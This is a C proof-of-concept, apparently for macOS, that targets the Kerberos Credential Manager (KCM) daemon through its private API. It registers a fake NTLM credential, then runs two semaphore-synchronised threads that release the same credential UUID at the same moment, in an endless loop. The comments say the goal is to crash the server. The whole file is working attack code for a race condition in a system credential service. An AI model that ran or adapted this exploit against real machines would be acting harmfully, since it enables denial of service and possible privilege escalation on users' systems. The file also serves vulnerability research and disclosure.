#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <dispatch/dispatch.h>


typedef enum kcm_operation {
	KCM_OP_NOOP,
	KCM_OP_GET_NAME,
	KCM_OP_RESOLVE,
	KCM_OP_DEPRECATED_GEN_NEW,
	KCM_OP_INITIALIZE,
	KCM_OP_DESTROY,
	KCM_OP_STORE,
	KCM_OP_RETRIEVE,
	KCM_OP_GET_PRINCIPAL,
	KCM_OP_GET_CRED_UUID_LIST,
	KCM_OP_GET_CRED_BY_UUID,
	KCM_OP_REMOVE_CRED,
	KCM_OP_SET_FLAGS,
	KCM_OP_CHOWN,
	KCM_OP_CHMOD,
	KCM_OP_GET_INITIAL_TICKET,
	KCM_OP_GET_TICKET,
	KCM_OP_MOVE_CACHE,
	KCM_OP_GET_CACHE_UUID_LIST,
	KCM_OP_GET_CACHE_BY_UUID,
	KCM_OP_GET_DEFAULT_CACHE,
	KCM_OP_SET_DEFAULT_CACHE,
	KCM_OP_GET_KDC_OFFSET,
	KCM_OP_SET_KDC_OFFSET,
	KCM_OP_RETAIN_KCRED,
	KCM_OP_RELEASE_KCRED,
	KCM_OP_GET_UUID,
	/* NTLM operations */
	KCM_OP_ADD_NTLM_CRED,
	KCM_OP_HAVE_NTLM_CRED,
	KCM_OP_ADD_NTLM_CHALLENGE,
	KCM_OP_DO_NTLM_AUTH,
	KCM_OP_GET_NTLM_USER_LIST,
	/* SCRAM */
	KCM_OP_ADD_SCRAM_CRED,
	KCM_OP_HAVE_SCRAM_CRED,
	KCM_OP_DEL_SCRAM_CRED,
	KCM_OP_DO_SCRAM_AUTH,
	KCM_OP_GET_SCRAM_USER_LIST,
	/* GENERIC */
	KCM_OP_DESTROY_CRED,
	KCM_OP_RETAIN_CRED,
	KCM_OP_RELEASE_CRED,
	KCM_OP_CRED_LABEL_GET,
	KCM_OP_CRED_LABEL_SET,
	/* */
	KCM_OP_CHECK_NTLM_CHALLENGE,
	KCM_OP_GET_CACHE_PRINCIPAL_LIST,
	KCM_OP_MAX
} kcm_operation;

typedef int32_t krb5_error_code;
typedef unsigned char krb5_uuid[16];

struct heim_base_data {
	size_t length;
	void *data;
};

typedef struct heim_base_data heim_octet_string;
typedef heim_octet_string krb5_data;

krb5_error_code krb5_init_context(void* context);
krb5_error_code krb5_kcm_storage_request(void* context, uint16_t opcode, void** storage);
krb5_error_code krb5_store_uuid(void* storage, krb5_uuid uuid);
krb5_error_code krb5_store_int32(void* storage, int32_t len);
krb5_error_code krb5_store_stringz(void* storage, const char* str);
krb5_error_code krb5_store_data(void* storage, krb5_data data);
krb5_error_code krb5_ret_uuid(void *storage, krb5_uuid uuid);
krb5_error_code krb5_kcm_call(void* context, void* request, void* response, krb5_data* response_data);

typedef struct _thread_info
{
	void* krb_context;
	dispatch_semaphore_t wait_sem;
	dispatch_semaphore_t signal_sem;
} thread_info, *thread_info_t;

char* nice_buf = "BBBB";

krb5_uuid cred_uuid;

dispatch_semaphore_t sem1;
dispatch_semaphore_t sem2;

void* krb_context_thread1;
void* krb_context_thread2;

bool t1done = true;
bool t2done = true;

void add_cred(void* krb_context, char* name, krb5_uuid out_uuid)
{
	void* storage = NULL;
	krb5_error_code err = 0;
	err = krb5_kcm_storage_request(krb_context, KCM_OP_ADD_NTLM_CRED, &storage);

	// fake nthash, contents don't actually matter
	krb5_data nthash;
	nthash.length = 4;
	nthash.data = nice_buf;

	err = krb5_store_stringz(storage, name); // user
	err = krb5_store_stringz(storage, "debug"); // domain
	err = krb5_store_data(storage, nthash); // fake hash


	// send the message
	void* response = NULL;
	krb5_data response_data;

	err = krb5_kcm_call(krb_context, storage, &response, &response_data);
	//printf("msg: call err %i\n", err);

	krb5_ret_uuid(response, out_uuid);
}

/*
  !!! THE FOLLOWING TWO FUNCTIONS ARE (MOSTLY) THE SAME !!!
  the only differences are the use of the t1done or t2done (I'm bad at threading)
  and the order of the calls to dispatch_semaphore_wait/dispatch_semaphore_signal,
  which are reversed to attempt to syncronize the api calls as much as possible
*/
void race_thread1(thread_info_t info)
{
	while(1)
	{
		while(t1done) {} // very hacky spin until add_cred is done
		void* storage = NULL;
		krb5_error_code err = 0;
		void* response = NULL;
		krb5_data response_data;

		// build our OP_RELEASE_CRED message, only contains the cred uuid
		err = krb5_kcm_storage_request(info->krb_context, KCM_OP_RELEASE_CRED, &storage);
		err = krb5_store_uuid(storage, cred_uuid);

		// syncronize with race_thread2
		dispatch_semaphore_wait(info->wait_sem, DISPATCH_TIME_FOREVER);
		dispatch_semaphore_signal(info->signal_sem);

		// attempt to call at the same time as race_thread2
		// this will (hopefully) crash the server
		err = krb5_kcm_call(info->krb_context, storage, &response, &response_data);
		t1done = true;
	}
}

void race_thread2(thread_info_t info)
{
	while(1)
	{
		while(t2done) {} // very hacky spin until add_cred is done
		void* storage = NULL;
		krb5_error_code err = 0;
		void* response = NULL;
		krb5_data response_data;

		// build our OP_RELEASE_CRED message, only contains the cred uuid
		err = krb5_kcm_storage_request(info->krb_context, KCM_OP_RELEASE_CRED, &storage);
		err = krb5_store_uuid(storage, cred_uuid);

		// syncronize with race_thread1
		dispatch_semaphore_signal(info->signal_sem);
		dispatch_semaphore_wait(info->wait_sem, DISPATCH_TIME_FOREVER);

		// attempt to call at the same time as race_thread2
		// this will (hopefully) crash the server
		err = krb5_kcm_call(info->krb_context, storage, &response, &response_data);
		t2done = true;
	}
}

int main(int argc, char** argv)
{
	krb5_error_code err = 0;

	// set up 3 connections: 1 for adding creds, and 2 for the race threads
	void* krb_context = NULL;
	err = krb5_init_context(&krb_context);
	printf("err: %i ctx: %p\n", err, krb_context);
	err = krb5_init_context(&krb_context_thread1);
	printf("err: %i ctx: %p\n", err, krb_context_thread1);
	err = krb5_init_context(&krb_context_thread2);
	printf("err: %i ctx: %p\n", err, krb_context_thread2);

	// set up the semaphores used to syncronize the race threads
	sem1 = dispatch_semaphore_create(1);
	sem2 = dispatch_semaphore_create(1);

	// Set up info passed into the threads:
	// only differences are connection contexts
	// and which semaphore is wait/signal
	thread_info thread1;
	thread1.krb_context = krb_context_thread1;
	thread1.wait_sem = sem1;
	thread1.signal_sem = sem2;
	thread_info thread2;
	thread2.krb_context = krb_context_thread2;
	thread2.wait_sem = sem2;
	thread2.signal_sem = sem1;
	
	// create & kick off threads to try to trigger the race
	pthread_t pt1;
	pthread_t pt2;
	pthread_create(&pt1, NULL, race_thread1, &thread1);
	pthread_create(&pt2, NULL, race_thread2, &thread2);

	// loop forever, adding creds and having the threads attempt to release them
	while(1)
	{
		if(t1done && t2done)
		{
			add_cred(krb_context, "kcm_poc", cred_uuid);
			t1done = false;
			t2done = false;
		}
	}
	return 0;
}
